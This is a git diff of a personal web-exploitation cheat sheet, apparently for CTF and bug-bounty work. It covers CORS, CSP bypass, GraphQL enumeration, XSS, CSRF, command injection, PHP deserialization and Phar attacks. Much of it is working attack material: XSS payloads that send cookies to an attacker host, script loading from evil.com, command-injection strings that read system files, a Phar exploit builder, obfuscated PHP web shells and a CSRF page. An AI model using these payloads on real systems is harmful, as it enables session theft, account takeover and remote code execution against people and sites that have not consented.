@@ -1,4 +1,4 @@
->WEB
+WEB
 
 #Headers
 
@@ -40,12 +40,12 @@ we will loose, so knowing if other content types are acceptable , we can use it 
 ```
 	const regex = /[<>]/;
         
-        if(regex.test(req.body.name)){
-            res.send("damn, You cant have brackets boy");
-        }else{
-            console.log("well, here is response that i'll directly render into web-page bcz you are baby whos brackets are exposed");
-            body.html(req.body.name)
-        }
+  if(regex.test(req.body.name)){
+      res.send("damn, You cant have brackets boy");
+  }else{
+      console.log("well, here is response that i'll directly render into web-page bcz you are baby whos brackets are exposed");
+      body.html(req.body.name)
+  }
 ```
 >Now , obviously the task is to call body.html with `<>` tag , but sure enough these tags are regexd .<br />
 <br/>
@@ -57,20 +57,55 @@ and this will bypass the filter as name is now a object not a string  .**
 **If an file uploader allows `Content-Type: text/xml` we can upload SWF which can be used for SOP bypass , XSS , Open redirect , and leak CSRF token etc. I have a xss.swf for it .**
 
 
-## Acess-Control-Allow-Origin
+## Acess-Control-Allow-Origin(ACAO)
 
-**This can be due to many reasons like `Misconfigured CORS` , `Bypassing checks etc` .Can be used to `full Acc. takeover` if `Access-Control-Allow-Credentials: true` ,`CSRF Token hijacking` etc. Best Values for us "**
+### what is?
 
-* `Access-Control-Allow-Origin: https://www.site.com.attacker.com`
-* `Access-Control-Allow-Origin: *`
-* `Access-Control-Allow-Origin: null`
+### Reason
+
+This can be due to many reasons like:
+
+* Misconfigured CORS
+* bad config of crossdomain.xml
+* Bypassing Server checks
+
+### Impact
+
+This Can be used to 
+
+* Full Acc. takeover if Access-Control-Allow-Credentials: true 
+* CSRF Token hijacking
+  etc
+
+
+### How to find
+
 
 ```
 curl https://test.victim.com/api/requestApiKey -H "Origin: https://evil.com" -v
 ```
->And check the response if Origin is reflected in the response in ACAO.
+And check the response if Origin is reflected in the response in ACAO.
 
-**Exploiting..**
+**Other types :** 
+
+* POORLY IMPLEMENTED, BEST CASE FOR ATTACK:
+```
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+```
+
+* POORLY IMPLEMENTED, EXPLOITABLE:
+```
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
+* BAD IMPLEMENTATION, Very Very hard mostly unexploitable:
+```
+Access-Control-Allow-Origin: *
+```
+
+### Exploiting
 ```
 	var req = new XMLHttpRequest();
 	req.onload = reqListener;
@@ -79,24 +114,50 @@ curl https://test.victim.com/api/requestApiKey -H "Origin: https://evil.com" -v
 	req.send();
 ```
 
-some resources : <br>
-https://www.geekboy.ninja/blog/tag/cors-exploitation/
-https://portswigger.net/kb/papers/exploitingcorsmisconfigurations.pdf
+### Smart Attack vectors
+```
+> Origin : https://www.attacker.com
 
+> Origin : https://www.site.com
+
+> Origin : https://test.site.com
+
+> Origin : https://www.site.com.attacker.com
+```
+
+
+### MORE ON
+
+* [CORS DETAILED](./docx/corsAttack.pdf)
 
 ## X-Forwarded-For
 
-**If you are unauthorized to access some page based on IP address**
-> so this is basically if u cant acccess a page bcz u dont belong to internal network
-this header is basically what usually progamming language use to determine the IP of 
-incomming request, so this might help you spoof IP
+### what is?
+More like IP-Addr Spoofing. <br/>
+This header is basically what usually progamming language use to determine the IP of incomming request.
 
+### Impact:
+Can be used to access blocked Pages which are only allowed by internal/specific IP-Addr.
+
+### How To Find
 ```
 GET / HTTP/1.1
 Origin: 192.121.22.45
 X-Forwarded-For: 192.121.22.2
 ```
-> use CTS(critical thinking skills) now to find its value, usually something from the network, or localhost or some trusted 3rd party site is using etc
+
+### Exploiting
+use CTS(critical thinking skills) now to find its value, usually something from the network, or localhost or some trusted 3rd party site is using etc
+
+### Smart attack vectors
+```
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 127.0.1.1
+X-Forwarded-For: 0
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 2130706433
+IPv6 etc
+```
 
 
 ## HSTS
@@ -127,9 +188,186 @@ Browser caches this request
 
 THis was used to block browsers xss filter lol.
 
-#Xss Tricks
 
-## Using `__proto__` to included blacklist values in object
+
+## Content security policy(CSP)
+
+### what is?
+This policy is mainly used to control the source of execution scripts like, allowing scipt to be executed only if they are from currentSite and disallow inline script , or iframe only of specific sites, styles tag served only from cloudflare or certain vendors.<br>
+
+*Basically disallowing running untrusted execution script*
+
+### How To Find
+```
+GET / HTTP/1.1
+Origin: 192.121.22.45
+Content-Security-policy: POLICY-LIST
+```
+
+Take the policy and paste@ https://csp-evaluator.withgoogle.com/ <br/>
+example policy,
+```
+
+default-src 'none';
+script-src 'nonce-23434534' 'strict-dynamic';
+style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
+img-src 'self';
+connect-src 'self';
+frame-src https://www.google.com/recaptcha/;
+form-action 'self';
+
+```
+copy all these into https://csp-evaluator.withgoogle.com/, and u will find 2 vulneribilities, base-uri missing i.e `<base>` tag attack, and self in script missing so `script-src attack`
+
+
+### Smart attack vectors
+
+* Missing `base-uri` in CSP 
+
+>Note! Its possible when there is HTML Injection in head and site uses relative URL and injection need to be in head for `<base>` tag
+
+If the scripts are loaded as `<script src='/app.js' nounce=1231231231>` and csp only allows to load script with nounce , using html injection we can add
+`<base src='https://evil.com'>`<br>
+and then scripts will be loaded from our url now
+
+* Exploiting `Missing script-src self`
+>Since script-src is not limited to self, we can load javascript from our own website. Additionally, we can even dynamically load javascript from specify URL.
+
+```
+exploit = <script src=http://example.com/evil.js>
+```
+will just fetch content of evil.js from our server as self is not mentioned in CSP.
+
+
+
+================================================================================================
+
+# GraphQL injection and enumeration
+
+## What is?
+
+GrpaphQL is query language used by server and database to communicate .
+
+## Reason
+
+GrpaphQL works this way, implementation of grpahQL properly isnt easy and same goes with authenticates routes , its not ez  so there are many problems .
+
+## Impact
+
+* Can leak whole database, bcz a graphQL query takes table to query and what columns to query to display and filter we want, so we can change this query just the way we wanted
+* It does takes filter to put on the query which can be exploited just like normal injection
+
+## How to find?
+
+A valid quey may look like:
+
+query= { TableToQuery(filter) { column1,column2 } }
+
+> here filter is option and can be simply { TableToQuery { column1,column2 } }
+
+So whenever you see such query try changing tableNames column etc .
+[some comman tables like user, admin, etc can be tried]
+
+and best part is sometimes does auto suggestion which just makes it easier. we will se in exploting wht i mean by tht.
+
+## Exploiting
+
+suppose you find a endpoint with no knowledge wht query should be passed so lets begin there
+
+testing if its valid endpoint
+```
+> query={}     
+
+<  {"errors":[{"message":"Syntax Error GraphQL request (1:2) Expected Name, found }\n\n1: {}\n    ^\n","locations":[{"line":1,"column":2}]}]}
+```
+Yes, So valid endpoint. Now lets see the `suggestion thing i was trying` <br />
+we dont know tablename but if we guess few prefix of tablename it suggests do you mean this which just tells actual name
+
+```
+> query = { us }
+
+< {"errors":[{"message":"Cannot query field \"us\" on type \"Query\". Did you mean \"user\"?","locations":[{"line":1,"column":2}]}]}
+```
+
+Oh yes i meant user lol
+
+```
+> query = { user }
+
+<  {"errors":[{"message":"Field \"user\" of type \"User\" must have a selection of subfields. Did you mean \"user { ... }\"?","locations":[{"line":1,"column":2}]}]}
+
+```
+
+Great now we need columns in this table, and well autosuggestion to rescue
+
+```
+> query={user {user} }
+
+< {"errors":[{"message":"Cannot query field \"user\" on type \"User\". Did you mean \"username\"?","locations":[{"line":1,"column":8}]}]}
+```
+
+Yes i need username
+
+```
+> query={user {username , pass} }
+
+< {"errors":[{"message":"Cannot query field \"pass\" on type \"User\". Did you mean \"password\"?","locations":[{"line":1,"column":8}]}]}
+```
+Yes password it is
+```
+> query={user {username , password} }
+
+< {"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
+```
+TADA , this is one way and not injection.. lets see how injection happens and that happend at filters usually.<br/>
+
+
+suppose the above query didnt worked and we can only query username
+
+```
+> query={user {username} }
+< {"data":{"user":{"username":"helpme@helpme.com"}}}
+```
+
+
+## Smart Attack Vectors
+
+
+
+# XSS
+
+## What is?
+
+
+## Reason
+
+Render user input ` without validation `
+
+## Impact
+
+* Full account takeover(Session hijacking) [if httpOnly flag is not set]
+* token extracting
+* RCE on some browsers
+
+## How to find?
+
+```
+* Payloads like <svg/onload=alert`1`> in every input field
+* adding `#` onto request, like site.com/#<svg>
+```
+
+## Exploiting
+
+```
+<svg onload=fetch(‘//HOST/?cookie=’+document.cookie)>
+<svg onload=”document.body.innerHTML='<img src=//HOST/IMAGE>'”>
+<iframe src=//HOST/ style=display:none></iframe>
+<script src=//HOST/SCRIPT></script>
+```
+
+## Smart Attack Vectors
+
+### Using `__proto__` to included blacklist values in object
 
 **Object proto property .**
 ```
@@ -150,7 +388,7 @@ if(t.thisCannotExist){
 > Bypass is simple. `userInput = {'__proto__' : { 'thisCannotExist' : 'yo' } }`.
 
 
-## Bypassing hard filters
+### Hard filters
 
 
 ** Injecting is inside Javascript, so out data is reflected in JS .**
@@ -169,43 +407,6 @@ WAF blocking **Spaces**,**onload=alert()**
 
 > `<img/src='1'/onerror/=console.log`1`/>`
 
-
-#CSP Bypass
-
-##Missing `base-uri` in CSP 
-
->Note! Its possible when there is HTML Injection in head and site uses relative URL and injection need to be in head for `<base>` tag
-
-If the scripts are loaded as `<script src='/app.js' nounce=1231231231>` and csp only allows to load script with nounce , using html injection we can add
-`<base src='https://evil.com'>`<br>
-and then scripts will be loaded from our url now
-
-##Exploiting `Missing script-src self`
->Since script-src is not limited to self, we can load javascript from our own website. Additionally, we can even dynamically load javascript from specify URL.
-
-```
-exploit = <script src=http://example.com/evil.js>
-```
-will just fetch content of evil.js from our server as self is not mentioned in CSP.
-
-
-##https://csp-evaluator.withgoogle.com/
-
-**Use that site to copy paste whole CSP and find vulneribilities**
-
-example copy,
-```
-
-default-src 'none';
-script-src 'nonce-23434534' 'strict-dynamic';
-style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
-img-src 'self';
-connect-src 'self';
-frame-src https://www.google.com/recaptcha/;
-form-action 'self';
-
-```
-all these into it, and u will find 2 exploits, base-uri missing i.e `<base>` tag attack, and self in script missing so `script-src attack`
 
 
 # SSRF and IP Bypass
@@ -357,9 +558,8 @@ or:
 
 
 
-# Comman Vulnerabilities
 
-## LFI/LFD
+# LFI/LFD
 
 > PHP LFI to RCE(PHP any-7.2)
 
@@ -378,7 +578,7 @@ $ ls -a /var/lib/php/sessions/
 so we control a file and its content and this is what session.upload_progress does. It creates a file with name of phpsessionid in /varr/lib/php/sessions/ , if its disabled it doesnt create this file.
 
 
-## python general files to bruteforce 
+# Python general files to bruteforce 
 
 > get /proc/self/cmdline can leak the location where the python app is loaded 
 
@@ -400,23 +600,54 @@ actual places where to look for below mentioned files are `/usr/src/rwctf/rwctf/
 
 
 
-## php general files to bruteforce get
 
+# IDOR
+# DATA Leak
 
-## IDOR
-## CORS
+# CSRF
 
-**ACAO header checking .**
+## What is?
 
-## DATA Leak
-## CSRF
+##Reason
 
-**Flashbased CSRF with SOP bypass(crossdomain.xml bug)**
+There should be a unique token to identify validity of each request made by client to validSite .<br/>
+If there is no token , an attacker can just make victim visit a link on victim browser with his cookie but attacker controlled data.<br/>
 
-> Caused due to misconfigured crossdomain.xml
+## Impact
+
+* Account takeover by password reset
+* Link users acount to my fb(social) account, thus getting account takeover
+* Changing users info,phone number etc
+
+## How to find?
+
+Just look for API's which changes user info and either 
+* donot have CSRF token
+* less random CSRF token
+* not validating CSRF token
+
+## Exploiting 
+
+if site.com/addMyPhoneNumber API is vulnerable to CSRF then create a.html
+```
+<script>
+x = new XMLHttpRequest();
+x.open("POST","site.com/addMyPhoneNumber");
+x.send({
+  number : "attackerNumber"
+});
+```
+send a.html to normal user and this will end up changing normal user name
+
+## Smart attack vectors
+
+### Flashbased CSRF with SOP bypass(crossdomain.xml bug)
+
+Caused due to misconfigured crossdomain.xml
+
 if in `crossdomain.xml` allowsites is * , we can perform this attack
 
-how crossdomain.xml?
+why crossdomain.xml? <br/>
 When we want data from xxx.com to evil.com with flash, Flash first check that Xxx.com has crossdomain.xml or not. If there It checks its details Like does it accept evil.com request or not
 
 Attack
@@ -447,10 +678,16 @@ header("Location: https://victim.com/user/endpoint/", true, 307);
 > User opens html, get redirected to out test.php with content mentioned in flash file, our test.php will redirect that request to `victim/user/endpoint` with SOP bypass
 
 
-## XML injection
-## XXE
+### Not using `state` for oauth
 
-## Parameter polluting
+For Facebook login oauth flaw if site is not using “state” parameter which is used to protect against CSRF attack, so even while adding social account from applications users setting same flawed oauth implementation is used.
+
+
+# XML injection
+
+# XXE
+
+# Parameter polluting
 
 >Tips
 * Always use `%26` instead of `&`
@@ -533,7 +770,7 @@ data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
 so the payload will cat everthing in ../, then write to _ .
 
 
-## File Uploading Injection
+# File Uploading Injection
 
 * Try `shell.php` , `shell.pHp5` , `shell.php4`,`shell.php4;`,`shell.php4%00` ,`shell.phtml`,`shell.pht` , `shell.pgif` , `shell.phpt`,`shell.shtml`
 * filename `<svg/onload=prompt(1)>.png`
@@ -542,7 +779,7 @@ so the payload will cat everthing in ../, then write to _ .
 * ~~ImageTragic~~ `have to read this`
 * shell in gif/png files
 
-## LDAP
+# LDAP
 
 **These are like sqli just use `*` or `|` or `&` to find it .**
 ```
@@ -556,7 +793,7 @@ http://web.chal.csaw.io:8080/index.php?search=pete*)(uid=123)(|(uid=*
 will inject uid
 ```
 
-## Command Injection
+# Command Injection
 
 ```
 blackList = [";","&","|"," ","cat"];
@@ -566,13 +803,20 @@ if blacklist.includes(userInput):
 else:
 	system("ping -c 4 ".userInput)[:86]; // so even if someone append something, ping's result is whats 									 // output only
 ```
-> exploit : `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
+> exploits : 
+* `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
+* `index.php/?cmd=$(cat</etc/passed>/tmp/out)`
+* `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
 > So there is a simple blacklist. so lets see how to solve it 
 
 * Use burp intruder we can find these blacklist 
 * Now we need to append our command but `&`,`;` and `|` are blocked, so lets see whats are its bypasses
 	* `%0a`, `%0A` 
 	* `^`
+	* `$(cat</etc/passed>/tmp/out)`
+	* ```
+	`ls`
+	```
 	* `%0d`, `%0D`
 * Next we need can simply make 'error' in 1st query by `ping error`%0a[nextCommand]
 * Now next command cannot have space, so we have many things to avaoid having space
@@ -590,7 +834,7 @@ else:
 
 
 
-## OAUTH2
+# OAUTH2
 
 >`/oauth2/authorize` gives you auth token to authorize urself 
 
@@ -614,7 +858,11 @@ else:
 * **This redirect uri if point to our url and still gives token is also a vulnerablility**<br/>
 
 
-## Shellshock
+### For Facebook login oauth flaw they were not using “state” parameter which used to protect against CSRF attack, so even while adding social account from applications users setting same flawed oauth implementation is used.
+
+
+
+# Shellshock
 
 > So if there is cgi-bin/* like cgi-bin/stats  , cgi-bin/netsparker.cgi 
 
@@ -656,15 +904,102 @@ out = PickleRce()
 ```
 
 
+## PHP Object deserialize
+
+
+> Trick to instant deserialize `__destruct` 
+
+```
+<?
+class SHIT{
+  public $x = "ls";
+
+  function __destruct(){
+    echo `$this->x`;
+  }
+
+}
+
+$what = deserialize($_GET['data']);
+
+throw new Exception('Well that was unexpected…');
+
+
+```
+`__destruct` is called by garbage collector and due to `Error`,u will just not get to it.
+
+so actual serialzed data of class SHIT will be:
+```
+O:4:"SHIT":1:{s:1:"x";s:2:"ls";}
+```
+but to get pass this, send
+```
+O:4:"SHIT":1:{s:2:"x";s:2:"ls";}
+```
+just corrupt the object and walla
+
+
+
+
+## PHP Phar
+
+so here is `makePharFile.php`
+```
+// create new Phar
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+// add object of any class as meta data
+class AnyClass {}                 // this is class u can exploit which will deserialize
+                                  // this wont be part of ur exploit and this class should have
+                                  // __destruct or __wakeup 
+$object = new AnyClass; 
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+```
+
+* Run above file and you will get exploit.phar and upload.
+* after upload if there is code with functions
+  * include("ourfile")
+  * require("ourfile")
+  * fopen("ourfile")
+  * file_get_contents("ourfile")    <---- can be easily there
+  * file("ourfile")         
+  * file_exists("ourfile")          <---- can be easily there, i mean whn u upload file they do check
+  * md5_file("ourfile")             <---- this can also exist
+  * filemtime("ourfile")
+  * filesize("ourfile")             <---- this is also comman
+
+so,
+```
+xxx.com/?file=phar://ourfile
+```
+Backend : 
+```
+  $file = $_GET['file'];
+  if(file_exists($file)){ <========== exploited
+
+  }
+```
+
+
+
+I mean yes noone will include, or require file we upload, but file_exists or file_get_contents is comman which will deserialize our payload 
+
+
+
 # Bypasses
 
 ## PHP REGEX bypass
 
-`cannot have " or '`
+### `cannot have " or '`
 
 ```
 > echo pack(C3,112,104,112);
-< php
+< "php"
 ```
 
 `$_GET['q'] is preg_match and we cannot have "flag.php" in it`
@@ -676,6 +1011,26 @@ out = PickleRce()
 
 > get_defined_vars()[_GET][X] & X=flag.php 
 ```
+### cannot use character 
+
+```
+$a = $_GET['a'];
+if(preg_match('/^[a-zA-Z0-9]$/'),$a){
+  echo "sorry";
+}else{
+  eval($a);
+}
+```
+
+> bypass
+
+```
+site.com/?a=~%8C%86%8C%8B%9A%92(~%9C%9E%8B%DF%D5)
+```
+
+* `~` will negate %8C%86%8C%8B%9A%92 tht will produce string "system" , similarly %9C%9E%8B%DF%D5 is `cat *`
+* in PHP "system"("ls") is system("ls") and we get answer
+
 ### Bypass 2 ** AWESOME TRICK **
 
 In php , if we send `site.com/?q=substr(asdf,0,10)`, so unlike most language showing asdf is not defined php will auto convert asdf to "asdf" string and pass into substr
@@ -852,11 +1207,62 @@ which indeed dont start with "/cannotViewThisPage" and when request module makes
 
 
 
+# PHP
+
+
+## shell without valid character
+
+Shell-1: you can execute it like "shell.php?0=system&1=ls"
+
+```
+<?
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+?>
+```
+
+`shell-2: You can execute it like "shell.php?_=system&__=ls"`
+
+```
+<?php
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+```
 
 
 
 
-<<<<<<< HEAD
-=======
 
->>>>>>> refs/remotes/origin/master
+# Node/JS
+
+## Array and text
+
+```
+["123"] == "123"
+true
+```
+
+
+# PATTERN
+
+
+## COOKIE patter
+
+.asd.asd.asd => python cookie token
+
+asd.asd.asd  => jwt token
+
+
+## HASH Pattern
+
+
+
+
+
